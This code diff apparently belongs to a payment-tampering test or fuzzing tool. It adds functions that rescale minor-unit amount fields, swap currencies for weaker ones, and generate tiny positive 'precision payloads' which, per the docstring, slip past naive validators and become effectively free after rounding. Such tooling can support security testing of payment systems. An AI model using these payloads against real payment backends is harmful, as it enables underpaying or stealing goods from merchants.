@@ -171,6 +171,64 @@ def is_attack_relevant(module: str, key: str, value: Any) -> bool:
     return ftype in allowed
 
 
+_MINOR_UNIT_KEY_RE = re.compile(r"(_cents|_minor|minor_units|_pence|_kobo)$", re.I)
+
+
+def is_minor_unit_field(key: str) -> bool:
+    return bool(_MINOR_UNIT_KEY_RE.search(key))
+
+
+def rescale_minor_unit_payload(original: Any) -> Any:
+    try:
+        n = float(original)
+    except (TypeError, ValueError):
+        return None
+    scaled = n / 100
+    if isinstance(original, int) and scaled == int(scaled):
+        return int(scaled)
+    return round(scaled, 2)
+
+
+_CURRENCY_WEAKER_NEIGHBOURS = {
+    "usd": ["ngn", "pkr", "idr"], "eur": ["ngn", "pkr"], "gbp": ["ngn", "pkr"],
+}
+
+
+def weaker_currency_candidates(value: Any) -> list[str]:
+    v = str(value).lower()
+    return _CURRENCY_WEAKER_NEIGHBOURS.get(v, [])
+
+
+def generate_precision_payloads(ftype: FieldType, original: Any) -> list[Any]:
+    """
+    Payloads that stay strictly positive and type-correct, so a strict
+    validator accepts them too, and exploit how the backend ROUNDS or
+    ACCUMULATES rather than whether it rejects an obviously wrong value.
+    Each one must still read as "a valid charge greater than zero" to a
+    naive `value > 0` guard while being effectively free or distorted
+    once floating-point rounding or truncation is applied downstream.
+    """
+    out: list[Any] = []
+
+    if ftype == FieldType.FLOAT:
+        try:
+            n = float(original)
+        except (TypeError, ValueError):
+            n = 1.0
+        out += [0.0049, 0.004, 1e-9, round(n * 0.0001, 6) or 0.0001]
+
+    elif ftype == FieldType.MONETARY_STRING:
+        out += ["0.004", "0.0049", "0.00000001"]
+
+    elif ftype == FieldType.INTEGER:
+        out += ["0.9", 0.9, "1e2"]
+
+    return out
+
+
+
+
+
 
 
 
